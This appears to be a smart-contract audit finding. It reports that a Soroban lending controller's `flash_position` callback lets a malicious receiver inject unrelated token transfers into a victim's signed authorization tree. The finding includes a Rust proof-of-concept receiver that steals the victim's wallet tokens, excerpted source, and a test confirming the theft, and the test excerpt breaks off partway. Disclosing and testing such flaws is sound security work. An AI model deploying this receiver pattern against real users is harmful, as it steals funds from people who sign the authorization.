### Title
Flash-position receiver can execute unauthorized calls under the caller’s authorization tree - (File: contracts/controller/src/strategies/flash_position.rs)

### Summary
`flash_position` accepts a caller-selected receiver contract and invokes it while the caller’s authorization context is active. A malicious receiver can request additional authorization from the `initiator`, causing unrelated token transfers to appear as child invocations of the signed `flash_position` authorization tree. If the victim signs that tree, the receiver can steal wallet assets unrelated to the lending position.

### Finding Description
`process_flash_position` authenticates `caller`, but accepts any deployed Wasm `receiver` other than the controller or pool. [1](#0-0) 

The controller mints the requested debt and forwards it to that receiver before invoking `execute_flash_position`, passing the victim as `initiator`. [2](#0-1) 

Soroban records nested authorization requests beneath the outer caller authorization. A contract reached through a user-supplied route can therefore add a token transfer from the caller as a child invocation; the repository’s auth-tree test demonstrates this behavior. [3](#0-2) 

A malicious flash-position receiver can use the supplied `initiator` argument to invoke an unrelated token’s `transfer(initiator, attacker, amount)`. Simulation records that transfer under the victim’s `flash_position` authorization entry; once the victim signs the resulting tree, the host permits it. The same test shows enforced authorization succeeds when the malicious child transfer is included in the signed tree. [4](#0-3) 

The post-callback checks measure declared collateral, process refunds, and enforce final solvency, but they do not prevent arbitrary external calls or extra authorization requests made by the receiver. [5](#0-4) 

### Impact Explanation
A malicious receiver can steal any wallet asset for which the victim signs the injected child authorization, including assets never supplied to the lending protocol. The exploit can still satisfy the flash-position collateral requirements and final health checks, so the theft does not depend on the lending transaction reverting. This is theft of user funds.

### Likelihood Explanation
Exploitation requires the victim to submit or sign a `flash_position` transaction naming the malicious receiver and to authorize a simulation-produced tree containing the extra transfer. That is plausible when a frontend, strategy service, or malicious contract supplies the receiver and the wallet does not clearly display every nested authorization. The required transaction is permissionless, but the signing requirement and visible authorization-tree anomaly limit the severity to Medium.

### Recommendation
Clients and wallets integrating `flash_position` should reject any authorization tree containing child invocations beyond those expected for the specific operation. Prefer protocol-configured or audited receiver contracts where possible. At minimum, display the full contract, function, source address, recipient, and amount for every nested authorization before signing. The protocol cannot reliably prevent a caller-selected contract from requesting additional caller authorization, so authorization-tree validation is the primary mitigation.

### Proof of Concept
1. Deploy a receiver implementing `execute_flash_position`.
2. In the callback, use the supplied `initiator` as the source for an unrelated token transfer to the attacker:

```rust
fn execute_flash_position(
    env: Env,
    initiator: Address,
    account_id: u64,
    asset: Address,
    amount: i128,
    fee: i128,
    amount_received: i128,
    controller: Address,
    data: Bytes,
) {
    token::Client::new(&env, &victim_wallet_token).transfer(
        &initiator,
        &attacker,
        &victim_wallet_balance,
    );

    // Separately transfer sufficient declared collateral to `controller`
    // so the flash-position settlement and risk checks pass.
}
```

3. Have the victim invoke:

```text
flash_position(
    caller = victim,
    account_id = victim_account,
    spoke_id = configured_spoke,
    mode = Multiply,
    debt = HubAssetKey { hub_id, asset },
    amount = borrow_amount,
    receiver = malicious_receiver,
    data = attacker_payload,
    collaterals = [sufficient positive collateral minimum],
    refund_assets = []
)
```

4. Simulation records the unrelated wallet-token transfer as a child of the victim’s `flash_position` authorization.
5. If the victim signs the resulting tree, the host executes the malicious transfer and the callback can still provide enough collateral for the transaction to complete successfully.

pub(crate) fn process_flash_position(
    env: &Env,
    caller: &Address,
    params: FlashPositionParams<'_>,
) -> u64 {
    require_authorized_caller(env, caller);

    let FlashPositionParams {
        account_id,
        spoke_id,
        mode,
        debt,
        amount,
        receiver,
        data,
        collaterals,
        refund_assets,
    } = params;

    require_positive_amount(env, amount);
    config::require_hub_active(env, debt.hub_id);
    assert_with_error!(
        env,
        matches!(
            mode,
            PositionMode::Multiply | PositionMode::Long | PositionMode::Short
        ),
        CollateralError::InvalidPositionMode
    );
    require_wasm_receiver(env, receiver);

    let controller = env.current_contract_address();
    assert_with_error!(
        env,
        *receiver != controller,
        FlashLoanError::InvalidFlashloanReceiver
    );

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
